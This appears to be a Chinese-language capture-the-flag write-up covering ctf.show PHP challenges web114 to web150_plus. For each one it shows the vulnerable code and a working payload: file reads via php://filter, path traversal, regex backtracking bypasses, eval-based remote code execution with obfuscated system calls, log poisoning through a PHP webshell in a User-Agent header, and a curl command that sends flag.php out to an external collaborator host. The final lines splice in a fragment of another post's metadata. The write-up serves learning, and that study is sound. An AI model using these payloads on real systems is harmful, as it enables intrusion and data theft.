web114\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\nfunction filter($file){\n    if(preg_match('/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i',$file)){\n        die('hacker!');\n    }else{\n        return $file;\n    }\n}\n$file=$_GET['file'];\necho \"师傅们居然tql都是非预期 哼！\";\nif(! is_file($file)){\n    highlight_file(filter($file));\n}else{\n    echo \"hacker!\";\n}\n```\n\n`compress`和`root`被ban掉了，\n\n山重水复疑无路，柳暗花明又一村\n\n`filter`没有ban\n\npayload\n\n```\n?file=php://filter/resource=flag.php\n```\n\n\n\n### web115\n\n```\ninclude('flag.php');\nhighlight_file(__FILE__);\nerror_reporting(0);\nfunction filter($num){\n    $num=str_replace(\"0x\",\"1\",$num);\n    $num=str_replace(\"0\",\"1\",$num);\n    $num=str_replace(\".\",\"1\",$num);\n    $num=str_replace(\"e\",\"1\",$num);\n    $num=str_replace(\"+\",\"1\",$num);\n    return $num;\n}\n$num=$_GET['num'];\nif(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){\n    if($num=='36'){\n        echo $flag;\n    }else{\n        echo \"hacker!!\";\n    }\n}else{\n    echo \"hacker!!!\"; \n```\n\n`trim`\n\n>  去除字符串首尾处的空白字符（或者其他字符）\n>\n>  果不指定第二个参数，**trim()** 将去除这些字符\n>\n>  - \" \" (ASCII *32* (*0x20*))，普通空格符。\n>  - \"\\t\" (ASCII *9* (*0x09*))，制表符。\n>  - \"\\n\" (ASCII *10* (*0x0A*))，换行符。\n>  - \"\\r\" (ASCII *13* (*0x0D*))，回车符。\n>  - \"\\0\" (ASCII *0* (*0x00*))，空字节符。\n>  - \"\\x0B\" (ASCII *11* (*0x0B*))，垂直制表符。\n\n这里我们写了个脚本\n\n```\n <?php\nfor($i=1;$i<=128;$i++){\n    $a=chr($i).'1';\n    if(trim($a)!=='1'&&is_numeric($a)){\n        echo urlencode(chr($i));\n        echo \"\\n\";\n    }\n    \n}\n```\n\n最后跑出来的结果是 %0c(换页符)\n\npayload\n\n```\n?num=%0c36\n```\n\n\n\n### web123\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\n$a=$_SERVER['argv'];\n$c=$_POST['fun'];\nif(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){\n    if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\"|\\'|\\,|\\.|\\;|\\?/\", $c)&&$c<=18){\n         eval(\"$c\".\";\");  \n         if($fl0g===\"flag_give_me\"){\n             echo $flag;\n         }\n    }\n}\n```\n\n这里有个很坑的点\n\n> 在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了，such as：`CTF[SHOW.COM`=>`CTF_SHOW.COM`\n\n也就是说当我面`POST`  `CTF_SHOW.COM`时，会自动解析成`CTF_SHOW_COM`\n\npayload\n\n```\nPOST: CTF_SHOW=1&CTF[SHOW.COM=2&fun=echo $flag\n```\n\n\n\n### web125\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\n$a=$_SERVER['argv'];\n$c=$_POST['fun'];\nif(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){\n    if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\"|\\'|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i\", $c)&&$c<=16){\n         eval(\"$c\".\";\");\n         if($fl0g===\"flag_give_me\"){\n             echo $flag;\n         }\n    }\n} \n```\n\n相比于上一题，题目过路的更多了，echo这些打印函数被过滤\n\n这里我们详细看\n\n```\n$a=$_SERVER['argv'];\n```\n\n> $_SERVER['argv']：\n>\n> 1、cli模式（命令行）下\n>\n> \t第一个参数$_SERVER['argv'][0]是脚本名，其余的是传递给脚本的参数\n>\n> 2、web网页模式下\n>\n> \t在web页模式下必须在php.ini开启register_argc_argv配置项\n> \t\t\n> \t设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果\n> \t\t\n> \t这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]\n> \t\t\n> \t$argv,$argc在web模式下不适用\n\n```\n我们是在网页模式下的，注意重点：\n$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]\n而 $_SERVER[‘QUERY_STRING’] 是获取查询语句，也就是?后面的语句\n```\n\npayload\n\n```\n?$fl0g=flag_give_me;\n\nPOST:CTF_SHOW=1&CTF[SHOW.COM=2&fun=eval($a[0])\n```\n\n另一种思路\n\n这里没有过滤`highlight_file()`于是我们可以构造\n\n```\nfun=highlight_file($_GET[1])\n```\n\npayload\n\n```\n?1=flag.php\nPOST:CTF_SHOW=1&CTF[SHOW.COM=2&fun=highlight_file($_GET[1])\n```\n\n\n\n### web126\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\n$a=$_SERVER['argv'];\n$c=$_POST['fun'];\nif(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){\n    if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\"|\\'|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i\", $c) && strlen($c)<=16){\n         eval(\"$c\".\";\");  \n         if($fl0g===\"flag_give_me\"){\n             echo $flag;\n         }\n    }\n} \n```\n\n与上题一样，这回多给几个payload\n\n```\nget: a=1+fl0g=flag_give_me\npost: CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])\n```\n\n数组中用加号(加号在url中起到空格的作用)分隔`$a[1]`对应的就是`fl0g=flag_give_me`，所以下面这种也是可以的\n\n```\nget: a=1+2+fl0g=flag_give_me//加号在url中起到空格的作用\npost: CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[2])\n```\n\n```\n<?php\n$a=$_SERVER['argv'];\nvar_dump($a);\n\n传入 a=1+fl0g=flag_give_me\n结果如下\narray(2) { [0]=> string(3) \"a=1\" [1]=> string(17) \"fl0g=flag_give_me\" }\n\n```\n\n\n\n### web127\n\n```\nerror_reporting(0);\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\n$ctf_show = md5($flag);\n$url = $_SERVER['QUERY_STRING'];\n\n\n//特殊字符检测\nfunction waf($url){\n    if(preg_match('/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\{|\\;|\\:|\\[|\\]|\\}|\\'|\\\"|\\<|\\,|\\>|\\.|\\\\\\|\\//', $url)){\n        return true;\n    }else{\n        return false;\n    }\n}\n\nif(waf($url)){\n    die(\"嗯哼？\");\n}else{\n    extract($_GET);\n}\n\n\nif($ctf_show==='ilove36d'){\n    echo $flag;\n}\n```\n\n> `$_SERVER['QUERY_STRING'];`获取的查询语句是服务端还没url解码的，所以url编码绕过即可：\n\n写个脚本跑一下\n\n```\n<?php\nfunction waf($num){\n    if(preg_match('/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\{|\\;|\\:|\\[|\\]|\\}|\\'|\\\"|\\<|\\,|\\>|\\.|\\\\\\|\\//', $num)){\n        return false;\n    }else{\n        return true;\n    }\n}\nfor($i = 0; $i<129; $i++){\n\t$num=chr($i);\n\tif(waf($num)){\n\t\techo \"未编码：\".$num.\"   经过编码：\".urlencode(chr($i)).\"\\n\";\n\t}\n}\n?>\n```\n\n空格可以绕过，%20\n\n**payload**\n\n```\n?ctf show=ilove36d\n```\n\n\n\n### web128\n\n```\nerror_reporting(0);\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\n\n$f1 = $_GET['f1'];\n$f2 = $_GET['f2'];\n\nif(check($f1)){\n    var_dump(call_user_func(call_user_func($f1,$f2)));\n}else{\n    echo \"嗯哼？\";\n}\n\n\n\nfunction check($str){\n    return !preg_match('/[0-9]|[a-z]/i', $str);\n}\n```\n\n这题我傻了。。，还是看大师傅的wp吧\n\n考察点是gettext拓展使用\n\n在开启该拓展后 _() 等效于 gettext()\n\n```\n<?php\necho gettext(\"phpinfo\");\n结果  phpinfo\n\necho _(\"phpinfo\");\n结果 phpinfo\n```\n\n所以 `call_user_func('_','phpinfo')` 返回的就是phpinfo\n\n因为我们要得到的flag就在flag.php中，所以可以直接用get_defined_vars\n\n```\nget_defined_vars ( void ) : array\n此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。\n```\n\n**payload**\n\n```\n?f1=_&f2=get_defined_vars\n```\n\n\n\n### web129\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\nif(isset($_GET['f'])){\n    $f = $_GET['f'];\n    if(stripos($f, 'ctfshow')>0){\n        echo readfile($f);\n    }\n}\n```\n\n路径穿越很简单\n\n`../`   回到上一级目录\n\n`./`    表示当前目录\n\n**payload**\n\n```\n?f=../../ctfshow../../../var/www/html/flag.php\n```\n\n\n\n### web130\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\nif(isset($_POST['f'])){\n    $f = $_POST['f'];\n\n    if(preg_match('/.+?ctfshow/is', $f)){\n        die('bye!');\n    }\n    if(stripos($f, 'ctfshow') === FALSE){\n        die('bye!!');\n    }\n\n    echo $flag;\n\n} \n```\n\n> preg_match不识别数组，否则返回false，匹配一次返回1，没有返回0\n>\n> if(0 === flase)返回值为false0不是强等于false的\n>\n> stripos()函数对数组不识别，遇到数组会返回null，null!==flase\n\n在/s模式下，.匹配任意字符，+表示重复一次或更多次，没错是至少一次！而后面加个?表示懒惰模式，+?表示重复1次或更多次，但尽可能少重复。当然懒惰模式并不影响解题思路，总之就是ctfshow前面必须得有字符才能匹配到，所以直接f=ctfshow就可以了\n\n**payload**\n\n```\n?f=ctfshow[]\n?f[]=1\n?f=ctfshow  (第一个正则匹配时，必须要在ctfshow前面有字符)\n```\n\n下面就要介绍p神的PCRE回溯\n\n> https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html\n\n\n\nPHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限`pcre.backtrack_limit`。我们可以通过`var_dump(ini_get('pcre.backtrack_limit'));`的方式查看当前环境下的上限：\n\n我们通过发送超长字符串的方式，使正则执行失败，最后绕过目标对PHP语言的限制。\n\n脚本\n\n```\nimport requests\nurl=\"http://e07a37a6-9144-4f12-a24c-2fcd2f8cdbd0.challenge.ctf.show/\"\ndata={\n    'f':'very'*250000+'ctfshow'\n}\nr=requests.post(url,data=data)\nprint(r.text)\n\n```\n\n\n\n### web131\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\nif(isset($_POST['f'])){\n    $f = (String)$_POST['f'];\n\n    if(preg_match('/.+?ctfshow/is', $f)){\n        die('bye!');\n    }\n    if(stripos($f,'36Dctfshow') === FALSE){\n        die('bye!!');\n    }\n\n    echo $flag;\n\n} \n```\n\n老老实实用PCRE回溯吧\n\n\n\n### web132\n\n扫出/admin\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\n\n\nif(isset($_GET['username']) && isset($_GET['password']) && isset($_GET['code'])){\n    $username = (String)$_GET['username'];\n    $password = (String)$_GET['password'];\n    $code = (String)$_GET['code'];\n\n    if($code === mt_rand(1,0x36D) && $password === $flag || $username ===\"admin\"){\n        \n        if($code == 'admin'){\n            echo $flag;\n        }\n        \n    }\n} \n```\n\n这题的突破点在于\n\n```\nif($code === mt_rand(1,0x36D) && $password === $flag || $username ===\"admin\")\n```\n\n```\n<?php\nif(false && false || true){\n\techo \"true!\";\n}else{\n    echo \"false!\";\n}\n?>\n\n//返回结果为true\n```\n\n**payload**\n\n```\n?code=admin&password=admin&username=admin\n```\n\n\n\n### web133\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\n//flag.php\nif($F = @$_GET['F']){\n    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){\n        eval(substr($F,0,6));\n    }else{\n        die(\"6个字母都还不够呀?!\");\n    }\n}\n```\n\n```\nget传参   F=`$F `;sleep 3\n经过substr($F,0,6)截取后 得到  `$F `;\n也就是会执行 eval(\"`$F `;\");\n我们把原来的$F带进去\neval(\"``$F `;sleep 3`\");\n也就是说最终会执行  `   `$F `;sleep 3  ` == shell_exec(\"`$F `;sleep 3\");\n前面的命令我们不需要管，但是后面的命令我们可以自由控制。\n这样就在服务器上成功执行了 sleep 3\n所以 最后就是一道无回显的RCE题目了\n```\n\n无回显我们可以用反弹shell 或者curl外带 或者盲注\n 这里的话反弹没有成功，但是可以外带。\n\n```\ncurl  http://xxx:4567?p=`tac f*`\n```\n\n当然要是没有公网ip的话，bp也可以帮到我们这个忙\n\n**payload**\n\n```\n/?F=`$F` ;curl -X post -F xx=@flag.php http://zadcth92f5pgqbtmchfdumhi49a0yp.burpcollaborator.net;\n```\n\n\n\n### web134\n\n```\n$key1 = 0;\n$key2 = 0;\nif(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) {\n    die(\"nonononono\");\n}\n@parse_str($_SERVER['QUERY_STRING']);\nextract($_POST);\nif($key1 == '36d' && $key2 == '36d') {\n    die(file_get_contents('flag.php'));\n}\n```\n\n用`extract`进行变量覆盖\n\n测试一下\n\n```\nparse_str($_SERVER['QUERY_STRING']);\nvar_dump($_POST);\n//然后我们传入 _POST[‘a’]=123\n会发现输出的结果为array(1) { [\"‘a’\"]=> string(3) “123” }\n也就是说现在的$_POST[‘a’]存在并且值为123\n```\n\n**payload**\n\n```\n?_POST[key1]=36d&_POST[key2]=36d\n```\n\n\n\n### web135\n\n```\nhighlight_file(__FILE__);\n//flag.php\nif($F = @$_GET['F']){\n    if(!preg_match('/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i', $F)){\n        eval(substr($F,0,6));\n    }else{\n        die(\"师傅们居然破解了前面的，那就来一个加强版吧\");\n    }\n}\n```\n\n**payload**\n\n```\n?F=`$F` ;cp flag.php 2.txt;\n?F=`$F` ;uniq flag.php>4.txt;\n```\n\n\n\n### web136\n\n```\n <?php\nerror_reporting(0);\nfunction check($x){\n    if(preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\?|\\{|\\}|\\>|\\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){\n        die('too young too simple sometimes naive!');\n    }\n}\nif(isset($_GET['c'])){\n    $c=$_GET['c'];\n    check($c);\n    exec($c);\n}\nelse{\n    highlight_file(__FILE__);\n}\n?> \n```\n\n虽然过滤了很多，但是在linux中我们可以用tee写文件\n\n**payload**\n\n```\nls|tee 1.txt\nls / |tee 1.txt\ncat /f* |1.txt\n```\n\n\n\n### web137\n\n```\nhighlight_file(__FILE__);\nclass ctfshow\n{\n    function __wakeup(){\n        die(\"private class\");\n    }\n    static function getFlag(){\n        echo file_get_contents(\"flag.php\");\n    }\n}\n\n\n\ncall_user_func($_POST['ctfshow']); \n```\n\n很简单，直接调用ctfshow类里的getFlag方法\n\n```\nPOST:ctfshow=ctfshow::getFlag\n```\n\n借用yu22x师傅的拓展\n\n> php中 ->与:: 调用类中的成员的区别\n> ->用于动态语境处理某个类的某个实例\n> ::可以调用一个静态的、不依赖于其他初始化的类方法.\n>\n> **也就是说双冒号可以不用实例化类就可以直接调用类中的方法**\n\n\n\n### web138\n\n```\nhighlight_file(__FILE__);\nclass ctfshow\n{\n    function __wakeup(){\n        die(\"private class\");\n    }\n    static function getFlag(){\n        echo file_get_contents(\"flag.php\");\n    }\n}\n\nif(strripos($_POST['ctfshow'], \":\")>-1){\n    die(\"private function\");\n}\n\ncall_user_func($_POST['ctfshow']);\n```\n\n相比于上一题，这个题过滤了冒号\n\ncall_user_func中不但可以传字符串也可以传数组\n\n本地测试\n\n```\ncall_user_func(array($classname, 'say_hello'));\n这时候会调用 classname中的 say_hello方法\n```\n\n**payload**\n\n```\nctfshow[0]=ctfshow&ctfshow[1]=getFlag\n```\n\n\n\n### web139\n\n```\n <?php\nerror_reporting(0);\nfunction check($x){\n    if(preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\?|\\{|\\}|\\>|\\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){\n        die('too young too simple sometimes naive!');\n    }\n}\nif(isset($_GET['c'])){\n    $c=$_GET['c'];\n    check($c);\n    exec($c);\n}\nelse{\n    highlight_file(__FILE__);\n}\n?> \n```\n\n只能盲打咯\n\n脚本\n\n```\nimport requests\nimport time\nimport string\nstr=string.digits+string.ascii_lowercase+\"-\"\nresult=\"\"\nkey=0\nfor j in range(1,45):\n    print(j)\n    if key==1:\n        break\n    for n in str:\n        payload=\"if [ `cat /f149_15_h3r3|cut -c {0}` == {1} ];then sleep 3;fi\".format(j,n)\n        #print(payload)\n        url=\"http://47f5a8e0-42e2-4260-9f27-ec8d922b6561.challenge.ctf.show/?c=\"+payload\n        try:\n            requests.get(url,timeout=(2.5,2.5))\n        except:\n            result=result+n\n            print(result)\n            break\n\n```\n\n\n\n### web140\n\n```\nhighlight_file(__FILE__);\nif(isset($_POST['f1']) && isset($_POST['f2'])){\n    $f1 = (String)$_POST['f1'];\n    $f2 = (String)$_POST['f2'];\n    if(preg_match('/^[a-z0-9]+$/', $f1)){\n        if(preg_match('/^[a-z0-9]+$/', $f2)){\n            $code = eval(\"return $f1($f2());\");\n            if(intval($code) == 'ctfshow'){\n                echo file_get_contents(\"flag.php\");\n            }\n        }\n    }\n}\n\n```\n\n```\nif(intval($code) == 'ctfshow')\n```\n\n这里进行的是弱比较,可以用null绕过\n\n```\n$code = eval(\"return $f1($f2());\"); \n```\n\n```\nintval('a')==0 intval('.')==0 intval('/')==0\n```\n\npayload\n\n```\nmd5(phpinfo())\nmd5(sleep())\nmd5(md5())\ncurrent(localeconv)\nsha1(getcwd())     因为/var/www/html md5后开头的数字所以我们改用sha1\n```\n\n实际上乱弄一些函数都可以，最后得到的结果是null同样符合条件\n\n\n\n### web141\n\n```\nhighlight_file(__FILE__);\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\n    $v1 = (String)$_GET['v1'];\n    $v2 = (String)$_GET['v2'];\n    $v3 = (String)$_GET['v3'];\n\n    if(is_numeric($v1) && is_numeric($v2)){\n        if(preg_match('/^\\W+$/', $v3)){\n            $code =  eval(\"return $v1$v3$v2;\");\n            echo \"$v1$v3$v2 = \".$code;\n        }\n    }\n} \n```\n\n`/^\\W+$/` 作用是匹配非数字字母下划线的字符,\n\n看看下面这句话\n\n```\neval(\"return 1;phpinfo();\");\n```\n\n显然这里的`phpinfo()`是不执行的，但数字是可以和命令进行一些运算的，例如 `1-phpinfo();`是可以执行phpinfo()命令的。\n\n```\neval(\"return 1-phpinfo();\");//可以执行\n```\n\n**payload**\n\n```\nv1=1&v3=-(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)-&v2=1\n```\n\n\n\n### web142\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\nif(isset($_GET['v1'])){\n    $v1 = (String)$_GET['v1'];\n    if(is_numeric($v1)){\n        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);\n        sleep($d);\n        echo file_get_contents(\"flag.php\");\n    }\n} \n```\n\n这里我们令`v1=0`就可以让`$d=0`\n\n\n\n### web143\n\n```\nhighlight_file(__FILE__);\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\n    $v1 = (String)$_GET['v1'];\n    $v2 = (String)$_GET['v2'];\n    $v3 = (String)$_GET['v3'];\n    if(is_numeric($v1) && is_numeric($v2)){\n        if(preg_match('/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\{|\\}|\\~|\\%|\\&|\\;/i', $v3)){\n                die('get out hacker!');\n        }\n        else{\n            $code =  eval(\"return $v1$v3$v2;\");\n            echo \"$v1$v3$v2 = \".$code;\n        }\n    }\n}\n```\n\n过滤了加减，我们可以用乘除，过滤了取反我们可以用异或\n\n**payload**\n\n```\nv1=1&v3=*(\"%0c%06%0c%0b%05%0d\"^\"%7f%7f%7f%7f%60%60\")(\"%0b%01%03%00%06%00\"^\"%7f%60%60%20%60%2a\")*&v2=1\n```\n\n\n\n### web144\n\n```\nhighlight_file(__FILE__);\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\n    $v1 = (String)$_GET['v1'];\n    $v2 = (String)$_GET['v2'];\n    $v3 = (String)$_GET['v3'];\n\n    if(is_numeric($v1) && check($v3)){\n        if(preg_match('/^\\W+$/', $v2)){\n            $code =  eval(\"return $v1$v3$v2;\");\n            echo \"$v1$v3$v2 = \".$code;\n        }\n    }\n}\n\nfunction check($str){\n    return strlen($str)===1?true:false;\n}\n```\n\n与前面几个题类似，将v1,v2,v3三个顺序重新调一下就好了\n\n**payload**\n\n```\n?v1=1&v3=-&v2=(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)\n```\n\n\n\n### web155\n\n```\nhighlight_file(__FILE__);\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\n    $v1 = (String)$_GET['v1'];\n    $v2 = (String)$_GET['v2'];\n    $v3 = (String)$_GET['v3'];\n    if(is_numeric($v1) && is_numeric($v2)){\n        if(preg_match('/[a-z]|[0-9]|\\@|\\!|\\+|\\-|\\.|\\_|\\$|\\}|\\%|\\&|\\;|\\<|\\>|\\*|\\/|\\^|\\#|\\\"/i', $v3)){\n                die('get out hacker!');\n        }\n        else{\n            $code =  eval(\"return $v1$v3$v2;\");\n            echo \"$v1$v3$v2 = \".$code;\n        }\n    }\n}\n```\n\n看了yu22x师傅的wp，妙！\n\n```\neval(\"return 1?phpinfo():1;\");\n```\n\n这里考察了三目运算符，这里是可以执行phpinfo()的\n\n```\n?v1=1&v3=?(~%8F%97%8F%96%91%99%90)():&v2=1\n```\n\n这样可以执行phpinfo()\n\npayload\n\n```\n?v1=1&v3=?(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5):&v2=1\n```\n\n\n\n### web146\n\n```\nhighlight_file(__FILE__);\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\n    $v1 = (String)$_GET['v1'];\n    $v2 = (String)$_GET['v2'];\n    $v3 = (String)$_GET['v3'];\n    if(is_numeric($v1) && is_numeric($v2)){\n        if(preg_match('/[a-z]|[0-9]|\\@|\\!|\\:|\\+|\\-|\\.|\\_|\\$|\\}|\\%|\\&|\\;|\\<|\\>|\\*|\\/|\\^|\\#|\\\"/i', $v3)){\n                die('get out hacker!');\n        }\n        else{\n            $code =  eval(\"return $v1$v3$v2;\");\n            echo \"$v1$v3$v2 = \".$code;\n        }\n    }\n} \n```\n\n过滤了冒号，无法使用三目运算符，但是可以使用等号和位运算符\n\n```\neval(\"return 1==phpinfo()||1;\");\n```\n\n这里可以执行phpinfo()\n\n**payload**\n\n```\n?v1=1&v3===(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)||&v2=1\n\n?v1=1&v3=|('%13%19%13%14%05%0d'|'%60%60%60%60%60%60')('%14%01%03%20%06%02'|'%60%60%60%20%60%28')|&v2=1\n\n?v1=1&v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|&v2=1\n```\n\n\n\n### web147\n\n```\nhighlight_file(__FILE__);\n\nif(isset($_POST['ctf'])){\n    $ctfshow = $_POST['ctf'];\n    if(!preg_match('/^[a-z0-9_]*$/isD',$ctfshow)) {\n        $ctfshow('',$_GET['show']);\n    }\n\n}\n```\n\n不会，还是老老实实看wp吧。\n\n考察点：create_function()代码注入\n\n```\ncreate_function('$a','echo $a.\"123\"')\n\n类似于\n\nfunction f($a) {\n  echo $a.\"123\";\n}\n\n```\n\n那么如果我们第二个参数传入 echo 1;}phpinfo();//\n 就等价于\n\n```\nfunction f($a) {\n  echo 1;}phpinfo();//\n}\n从而执行phpinfo()命令\nfuzz后发现%5c可以绕过这个正则表达式\n```\n\n**payload**\n\n```\nget: ?show=echo 123;}system('tac f*');//\npost: ctf=%5ccreate_function\n```\n\n\n\n### web148\n\n```\ninclude 'flag.php';\nif(isset($_GET['code'])){\n    $code=$_GET['code'];\n    if(preg_match(\"/[A-Za-z0-9_\\%\\\\|\\~\\'\\,\\.\\:\\@\\&\\*\\+\\- ]+/\",$code)){\n        die(\"error\");\n    }\n    @eval($code);\n}\nelse{\n    highlight_file(__FILE__);\n}\n\nfunction get_ctfshow_fl0g(){\n    echo file_get_contents(\"flag.php\");\n}\n```\n\n未过滤异或，直接构造\n\n**payload**\n\n```\n?code=(\"%08%02%08%09%05%0d\"^\"%7b%7b%7b%7d%60%60\")(\"%09%01%03%01%06%02\"^\"%7d%60%60%21%60%28\");\n```\n\n\n\n### web149\n\n```\nerror_reporting(0);\nhighlight_file(__FILE__);\n\n$files = scandir('./'); \nforeach($files as $file) {\n    if(is_file($file)){\n        if ($file !== \"index.php\") {\n            unlink($file);\n        }\n    }\n}\n\nfile_put_contents($_GET['ctf'], $_POST['show']);\n\n$files = scandir('./'); \nforeach($files as $file) {\n    if(is_file($file)){\n        if ($file !== \"index.php\") {\n            unlink($file);\n        }\n    }\n}\n```\n\n非预期\n\n往index.php直接写马，然后蚁剑连接即可\n\n预期解\n\n文件竞争，一个负责一直写文件，一个负责一直读文件\n\n\n\n### web150\n\n```\ninclude(\"flag.php\");\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass CTFSHOW{\n    private $username;\n    private $password;\n    private $vip;\n    private $secret;\n\n    function __construct(){\n        $this->vip = 0;\n        $this->secret = $flag;\n    }\n\n    function __destruct(){\n        echo $this->secret;\n    }\n\n    public function isVIP(){\n        return $this->vip?TRUE:FALSE;\n        }\n    }\n\n    function __autoload($class){\n        if(isset($class)){\n            $class();\n    }\n}\n\n#过滤字符\n$key = $_SERVER['QUERY_STRING'];\nif(preg_match('/\\_| |\\[|\\]|\\?/', $key)){\n    die(\"error\");\n}\n$ctf = $_POST['ctf'];\nextract($_GET);\nif(class_exists($__CTFSHOW__)){\n    echo \"class is exists!\";\n}\n\nif($isVIP && strrpos($ctf, \":\")===FALSE){\n    include($ctf);\n}\n\n```\n\n日志绕过\n\n```\nPOST /?isVIP=1 HTTP/1.1\nHost: 76d1b363-e52c-456b-aff5-8c0c5ad8c0ad.challenge.ctf.show\nUser-Agent: <?php eval($_POST[1]);?>\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: _ga=GA1.2.1418869291.1680592508\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 49\n\nctf=/var/log/nginx/access.log&1=system('cat f*');\n```\n\n\n\n### web150_plus\n\n```\ninclude(\"flag.php\");\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass CTFSHOW{\n    private $username;\n    private $password;\n    private $vip;\n    private $secret;\n\n    function __construct(){\n        $this->vip = 0;\n        $this->secret = $flag;\n    }\n\n    function __destruct(){\n        echo $this->secret;\n    }\n\n    public function isVIP(){\n        return $this->vip?TRUE:FALSE;\n        }\n    }\n\n    function __autoload($class){\n        if(isset($class)){\n            $class();\n    }\n}\n\n#过滤字符\n$key = $_SERVER['QUERY_STRING'];\nif(preg_match('/\\_| |\\[|\\]|\\?/', $key)){\n    die(\"error\");\n}\n$ctf = $_POST['ctf'];\nextract($_GET);\nif(class_exists($__CTFSHOW__)){\n    echo \"class is exists!\";\n}\n\nif($isVIP && strrpos($ctf, \":\")===FALSE && strrpos($ctf,\"log\")===FALSE){\n    include($ctf);\n}\n```\n\n过滤了log，不能日志包含绕过了\n\n> ```\n> 这个题一点点小坑__autoload()函数不是类里面的\n> __autoload — 尝试加载未定义的类\n> 最后构造?..CTFSHOW..=phpinfo就可以看到phpinfo信息啦\n> 原因是..CTFSHOW..解析变量成__CTFSHOW__然后进行了变量覆盖，因为CTFSHOW是类就会使用\n> __autoload()函数方法，去加载，因为等于phpinfo就会去加载phpinfo\n> 接下来就去getshell啦\n> ```\n\n**payload**\n\n```\n/?..CTFSHOW..=phpinfo\n```\n\nphp变量不能含有点空格，遇到这些会自动转化为下划线\n\n\n\n\n\n------\n\n总算是写完啦，不过这永远不是终点...","source":"_posts/PHP特性.md","raw":"---\ntitle: PHP特性\ndate: 2022-03-21 21:23:21\nexcerpt: PHP特性\ncategories: 学习\n---\n\n# PHP特性\n\nphp特性这个东西很杂，覆盖的内容也很多，都是一些零碎的知识点，这次正好借这个刷题的机会，做一个小复习\n\n\n\n### web89\n\n```\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\n\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if(preg_match(\"/[0-9]/\", $num)){\n        